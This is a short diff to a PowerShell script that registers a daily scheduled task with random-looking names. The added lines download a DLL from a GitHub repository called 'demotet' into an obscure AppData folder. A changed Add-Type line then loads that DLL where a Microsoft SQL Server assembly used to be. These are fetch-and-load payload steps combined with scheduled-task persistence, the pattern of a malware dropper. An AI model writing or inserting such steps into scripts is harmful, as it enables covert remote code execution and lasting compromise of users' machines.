@@ -30,6 +30,6 @@ $trigger =  New-ScheduledTaskTrigger -Daily -At 9am
 
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "DHO8DE6FDE4FE45SFD78GG" -Description "JG43KGJK834GF5KJ6"
 
+Invoke-WebRequest -Uri https://github.com/tokio-oyama/demotet/blob/main/IK4GHD32HUHI4324UIHGFD9.dll -OutFile C:\Users\IEUser\AppData\Local\DKL432BHVYUVTYF643KHJK\IK4GHD32HUHI4324UIHGFD9.dll; 
 
-
-Add-Type -Path 'C:\Program Files\Microsoft SQL Server\110\SDK\Assemblies\Microsoft.SqlServer.Smo.dll'
+Add-Type -Path 'C:\Users\IEUser\AppData\Local\DKL432BHVYUVTYF643KHJK\IK4GHD32HUHI4324UIHGFD9.dll'
